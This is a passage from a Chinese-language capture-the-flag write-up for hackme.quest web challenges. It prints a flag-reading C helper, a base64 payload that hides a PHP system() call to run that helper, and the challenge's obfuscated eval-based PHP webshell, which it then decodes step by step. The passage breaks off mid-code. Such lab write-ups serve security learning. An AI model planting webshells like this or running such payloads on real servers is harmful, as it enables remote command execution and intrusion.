</code></pre><p>得到原始碼：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>#include</span> <span style=color:#78787e>&lt;stdio.h&gt;</span><span style=color:#78787e>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#78787e>#include</span> <span style=color:#78787e>&lt;sys stat.h&gt;</span><span style=color:#78787e>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#78787e>#include</span> <span style=color:#78787e>&lt;sys types.h&gt;</span><span style=color:#78787e>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#78787e>#include</span> <span style=color:#78787e>&lt;unistd.h&gt;</span><span style=color:#78787e>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#78787e>#include</span> <span style=color:#78787e>&lt;fcntl.h&gt;</span><span style=color:#78787e>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#78787e></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#9aedfe>int</span> <span style=color:#57c7ff>main</span>(<span style=color:#9aedfe>int</span> argc, <span style=color:#9aedfe>char</span> <span style=color:#ff6ac1>*</span>argv[])
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    <span style=color:#ff6ac1>const</span> <span style=color:#9aedfe>char</span> <span style=color:#ff6ac1>*</span>exec <span style=color:#ff6ac1>=</span> argv[<span style=color:#ff9f43>0</span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#ff6ac1>const</span> <span style=color:#9aedfe>char</span> <span style=color:#ff6ac1>*</span>flag <span style=color:#ff6ac1>=</span> argv[<span style=color:#ff9f43>1</span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#9aedfe>char</span> buffer[<span style=color:#ff9f43>4096</span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    <span style=color:#ff6ac1>if</span>(argc <span style=color:#ff6ac1>&lt;</span> <span style=color:#ff9f43>2</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        <span style=color:#57c7ff>printf</span>(<span style=color:#5af78e>&#34;Usage: %s flag</span><span style=color:#5af78e>\n</span><span style=color:#5af78e>&#34;</span>, argv[<span style=color:#ff9f43>0</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#57c7ff>puts</span>(<span style=color:#5af78e>&#34;We have cat to read file, And the meow to cat flag.&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>        <span style=color:#ff6ac1>return</span> <span style=color:#ff9f43>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    <span style=color:#ff6ac1>struct</span> stat S;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    <span style=color:#ff6ac1>if</span>(<span style=color:#57c7ff>stat</span>(exec, <span style=color:#ff6ac1>&amp;</span>S) <span style=color:#ff6ac1>!=</span> <span style=color:#ff9f43>0</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>        <span style=color:#57c7ff>printf</span>(<span style=color:#5af78e>&#34;Can not stat file %s</span><span style=color:#5af78e>\n</span><span style=color:#5af78e>&#34;</span>, exec);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        <span style=color:#ff6ac1>return</span> <span style=color:#ff9f43>1</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>    <span style=color:#9aedfe>uid_t</span> uid <span style=color:#ff6ac1>=</span> S.st_uid;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>    <span style=color:#9aedfe>gid_t</span> gid <span style=color:#ff6ac1>=</span> S.st_gid;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>    <span style=color:#57c7ff>setuid</span>(uid);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    <span style=color:#57c7ff>seteuid</span>(uid);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    <span style=color:#57c7ff>setgid</span>(gid);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>    <span style=color:#57c7ff>setegid</span>(gid);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>    <span style=color:#9aedfe>int</span> fd <span style=color:#ff6ac1>=</span> <span style=color:#57c7ff>open</span>(flag, O_RDONLY);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>    <span style=color:#ff6ac1>if</span>(fd <span style=color:#ff6ac1>==</span> <span style=color:#ff6ac1>-</span><span style=color:#ff9f43>1</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>        <span style=color:#57c7ff>printf</span>(<span style=color:#5af78e>&#34;Can not open file %s</span><span style=color:#5af78e>\n</span><span style=color:#5af78e>&#34;</span>, flag);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>        <span style=color:#ff6ac1>return</span> <span style=color:#ff9f43>2</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>    <span style=color:#9aedfe>ssize_t</span> readed <span style=color:#ff6ac1>=</span> <span style=color:#57c7ff>read</span>(fd, buffer, <span style=color:#ff6ac1>sizeof</span>(buffer) <span style=color:#ff6ac1>-</span> <span style=color:#ff9f43>1</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>    <span style=color:#ff6ac1>if</span>(readed <span style=color:#ff6ac1>&gt;</span> <span style=color:#ff9f43>0</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>        <span style=color:#57c7ff>write</span>(<span style=color:#ff9f43>1</span>, buffer, readed);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>    <span style=color:#57c7ff>close</span>(fd);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>}
</span></span></code></pre></div><p>看起來可以透過<code>meow</code>來讀取<code>flag3</code>，由於怕執行路徑會影響，所以先進入程式目錄下再執行它。</p><p>執行<code>cd ./flag3; ./meow flag3</code>：</p><pre tabindex=0><code>JGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImNkIC4vZmxhZzM7IC4vbWVvdyBmbGFnMyIpOw==.7a6a92f9480943230008e349105276dc1536a5c2f499b92c395d5360d37760a3
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/33/4_hu66fa5d28d6be504293fe1353aa79f74a_9356_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/33/4_hu66fa5d28d6be504293fe1353aa79f74a_9356_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/33/4_hu66fa5d28d6be504293fe1353aa79f74a_9356_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/33/4_hu66fa5d28d6be504293fe1353aa79f74a_9356_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/33/4_hu66fa5d28d6be504293fe1353aa79f74a_9356_660x0_resize_box_3.png alt style=width:100%></figure></p><p>Flag <code>FLAG{Oh, Looks like you have a shell. Please don't fuck up the system.}</code></p><hr><h2 class="relative group">34. <a href=https://wp.hackme.quest/ target=_blank>wordpress 1</a><div id=34-wordpress-1httpswphackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#34-wordpress-1httpswphackmequest aria-label=定位點>#</a></span></h2><blockquote><p>Something strange is hidding in the source code, find it.<br>Tips: This challenge does not require to exploit any thing, don’t use any scanner.</p></blockquote><p>題目似乎爛掉的樣子，先放著，之後有修再來解。</p><hr><h2 class="relative group">35. <a href=https://wp.hackme.quest/ target=_blank>wordpress 2</a><div id=35-wordpress-2httpswphackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#35-wordpress-2httpswphackmequest aria-label=定位點>#</a></span></h2><blockquote><p>Find another strange thing in the source code.<br>Tips: This challenge does not require to exploit any thing, don’t use any scanner.</p></blockquote><p>題目爛掉。</p><hr><h2 class="relative group">36. <a href=https://webshell.hackme.quest/ target=_blank>webshell</a><div id=36-webshellhttpswebshellhackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#36-webshellhttpswebshellhackmequest aria-label=定位點>#</a></span></h2><blockquote><p>You have my webshell, find the flag!</p></blockquote><p>這題一打開是空白畫面，按照慣例先看看原始碼。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/36/1_hu4c326811a4a3a2b062dae381d3087378_54155_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/36/1_hu4c326811a4a3a2b062dae381d3087378_54155_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/36/1_hu4c326811a4a3a2b062dae381d3087378_54155_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/36/1_hu4c326811a4a3a2b062dae381d3087378_54155_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/36/1_hu4c326811a4a3a2b062dae381d3087378_54155_660x0_resize_box_3.png alt style=width:100%></figure></p><p>看來這是當前頁面的 PHP 了。</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff5c57>$cation</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;St</span><span style=color:#5af78e>\x72\x5f</span><span style=color:#5af78e>r</span><span style=color:#5af78e>\x4f</span><span style=color:#5af78e>t</span><span style=color:#5af78e>\x31</span><span style=color:#5af78e>3&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff5c57>$e_obfus</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;b</span><span style=color:#5af78e>\x41</span><span style=color:#5af78e>Se</span><span style=color:#5af78e>\x36</span><span style=color:#5af78e>4</span><span style=color:#5af78e>\x5f\x44</span><span style=color:#5af78e>e</span><span style=color:#5af78e>\x43</span><span style=color:#5af78e>ode&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff5c57>$e_cod</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;g</span><span style=color:#5af78e>\x5a</span><span style=color:#5af78e>infl</span><span style=color:#5af78e>\x41</span><span style=color:#5af78e>t</span><span style=color:#5af78e>\x45</span><span style=color:#5af78e>&#34;</span> ; <span style=color:#ff5c57>$sourc</span> <span style=color:#ff6ac1>=</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#5af78e>&#34;St</span><span style=color:#5af78e>\x72\x72\x45</span><span style=color:#5af78e>v&#34;</span>; <span style=color:#ff6ac1>@</span><span style=color:#ff6ac1>eval</span> (<span style=color:#ff5c57>$sourc</span>(<span style=color:#ff5c57>$e_cod</span>(
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff5c57>$e_obfus</span>(<span style=color:#ff5c57>$cation</span>(<span style=color:#5af78e>&#34;KMSqn8VjTVKi9lgrcMtH3V
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#5af78e>qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#5af78e>H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#5af78e>qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#5af78e>nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#5af78e>/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#5af78e>cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#5af78e>sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#5af78e>TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#5af78e>A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#5af78e>STW8OO9t13k2/7r+He8BfU&#34;</span>)))));
</span></span></code></pre></div><p>看來經過編碼，先把它回推再說。<br>先把<code>hex</code>的部份轉換一下，然後稍微排版：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff5c57>$cation</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;Str_r0t13&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff5c57>$e_obfus</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;bASe64_DeCode&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff5c57>$e_cod</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;gZinflAtE&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff5c57>$sourc</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;StrrEv&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#ff6ac1>@</span><span style=color:#ff6ac1>eval</span>(<span style=color:#ff5c57>$sourc</span>(<span style=color:#ff5c57>$e_cod</span>(
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff5c57>$e_obfus</span>(<span style=color:#ff5c57>$cation</span>(<span style=color:#5af78e>&#34;KMSqn8VjTVKi9lgrcMtH3V
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#5af78e>qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#5af78e>H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#5af78e>qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#5af78e>nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#5af78e>/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#5af78e>cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#5af78e>sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#5af78e>TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#5af78e>A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#5af78e>STW8OO9t13k2/7r+He8BfU&#34;</span>)))));
</span></span></code></pre></div><p>所以可以理解成</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff6ac1>@</span><span style=color:#ff6ac1>eval</span>(strrev(gzinflate(base64_decode(str_rot13(<span style=color:#5af78e>&#34;KMSqn8VjTVKi9lgrcMtH3V
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#5af78e>qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#5af78e>H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#5af78e>qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#5af78e>nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#5af78e>/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#5af78e>cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#5af78e>sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#5af78e>TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#5af78e>A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#5af78e>STW8OO9t13k2/7r+He8BfU&#34;</span>)))));
</span></span></code></pre></div><ul><li><code>str_rot13()</code>：Perform the rot13 transform on a string</li><li><code>base64_decode()</code>：Decodes data encoded with MIME base64</li><li><code>gzinflate()</code>：Inflate a deflated string</li><li><code>strrev()</code>：Reverse a string</li><li><code>eval()</code>：Evaluate a string as PHP code</li></ul><p>(<del>好拉其實你只要把 eval 改成 echo 就可以輸出原始碼</del>)</p><p>Decode：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>run</span>() { 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span> <span style=color:#ff6ac1>if</span>(isset(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>]) <span style=color:#ff6ac1>&amp;&amp;</span> isset(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>])) { 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>  <span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> hash(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$_SERVER</span>[<span style=color:#5af78e>&#39;REMOTE_ADDR&#39;</span>]) <span style=color:#ff6ac1>^</span> (string)<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;cmd&#39;</span>]; 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>  <span style=color:#ff5c57>$key</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff5c57>$_SERVER</span>[<span style=color:#5af78e>&#39;HTTP_USER_AGENT&#39;</span>] <span style=color:#ff6ac1>.</span> sha1(<span style=color:#ff5c57>$_SERVER</span>[<span style=color:#5af78e>&#39;HTTP_HOST&#39;</span>]); 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>  <span style=color:#ff5c57>$sig</span> <span style=color:#ff6ac1>=</span> hash_hmac(<span style=color:#5af78e>&#39;SHA512&#39;</span>, <span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$key</span>); 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>  <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$sig</span> <span style=color:#ff6ac1>===</span> (string)<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;sig&#39;</span>]) { 
